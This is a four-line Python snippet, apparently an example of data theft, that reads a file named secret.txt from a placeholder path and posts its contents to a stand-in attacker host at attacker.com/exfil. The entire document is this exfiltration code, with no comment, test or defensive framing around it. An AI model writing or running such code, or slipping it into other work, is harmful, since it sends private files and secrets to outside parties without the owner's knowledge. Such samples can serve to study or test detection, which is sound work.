import requests

f = open('/path/to/secret.txt', 'r')
data = f.read()
requests.post('https://attacker.com/exfil', data=data)
